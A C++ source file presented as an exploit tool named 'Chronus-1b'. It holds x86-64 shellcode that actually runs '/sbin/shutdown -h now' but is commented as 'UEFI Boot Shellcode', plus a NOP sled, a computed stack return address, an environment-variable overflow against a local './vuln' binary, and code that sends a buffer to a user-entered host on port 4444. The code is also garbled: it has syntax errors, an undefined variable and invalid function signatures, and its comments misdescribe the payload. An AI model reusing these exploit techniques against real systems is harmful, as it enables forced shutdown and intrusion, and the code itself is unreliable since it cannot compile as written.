#include <unistd.h>
#include <sys/socket.h>
#include <iostream>
#include <netinet/in.h>
#include <stdio.h>

#include "resource/iphdr"

/*Define a Small buffer*/
#define VULN "./vuln`"
/* UEFI Boot Shellcode. */

#define port 4444
#define SIZE 160

char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
"\x50\x66\x68\x2d\x68\x48\x89\xe1"
"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
"\x74\x64\x6f\x77\x6e\x41\x52\x41"
"\x50\x48\x89\xe7\x52\x53\x51\x57"
"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
"\x05";
int sclen = sizeof(sc);

int main(char ** argv[], int * argc)  
{
    char p [SIZE]
    // our socket
    int ipv4 = socket(AF_INET, SOCK_STREAM, 0);
    
    // ENVP / Environment Variable Call : char * env  = {sc, NULL};
    char * env = {sc, NULL};
    char * vuln[] = {VULN, p, NULL };

    char nop_sled[SIZE];
    memset(nop_sled, 0x90, SIZE); // Fill the buffer with NOP instructions
    memcpy(nop_sled + SIZE - sizeof(sc) - 1, sc, sizeof(sc)); // Place the shellcode at the end of the NOP sled
    nop_sled[SIZE - 1] = '\0'; // Null-terminate the buffer
    
    // Declare a pointer, an index, and then a storage for the memory address of sc.
    int *ptr, i, addr;
    addr = 0xbffffffa - strlen(sc) - strlen(VULN);
    fprintf(stderr, "[***] using address: %#010x\n", addr); // Return shellcode address.

    // address structure
    char * address[256];
    struct hostent* host;

    int set, conn; // bind and connect placeholders.

    // IP Header configuration.
    h_data token;
    iphdr* header;

    char buffer[8] = {IPPROTO_TCP};

    std::ios::sync_with_stdio(true);

    printf(" Chronus-1b \n");

    printf(" Designed by poet5. \n \n");

    printf(" Enter in Linux Build: \n");

    std::cin >> address;

    printf("Getting host. \n");

    host = gethostbyname(address);

    if (host == NULL) 
    {
        herror("gethostbyname");
        exit(-1);
    }
    else 
    {
        printf(" Host found, initializing connection \n");
    }
    // *( struct in_addr*)host->h_addr_list

    sockaddr_in storage;
    storage.sin_addr.s_addr = INADDR_ANY;
    storage.sin_family = AF_INET;
    storage.sin_port = htons(port); // Port 0 is for dynamic port.

    sockaddr_in remote;
    remote.sin_addr =*(struct in_addr *)host->h_addr_list[0].
    remote.sin_family = AF_INET;
    remote.sin_port = htons(port);

    set = bind(ipv4, (sockaddr*)&storage, sizeof(storage) );

    if (set < 0) 
    {
        herror("bind");
        exit(-1);
    }

    // After initial connection has been made, declare IP Header.
    header = (struct iphdr *)malloc(sizeof(struct iphdr));
    memset(header, 0, sizeof(iphdr));
    header->saddr = INADDR_ANY;
    header->daddr = inet_addr(address);
    header->ttl = 5; // 5 seconds live time.
    header->protocol = IPPROTO_TCP;

    token.HtonData(header, buffer);


    // Connect to remote host
    if (connect(ipv4, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    // Send the shellcode
    if (send(ipv4, code, sizeof(code), 0) < 0) {
        perror("send");
        exit(EXIT_FAILURE);
    }

    // Close the socket
    execle(vuln[0], char(*)vuln, p, NULL, env);
    close(ipv4);
    free(header);
    return 0;
}
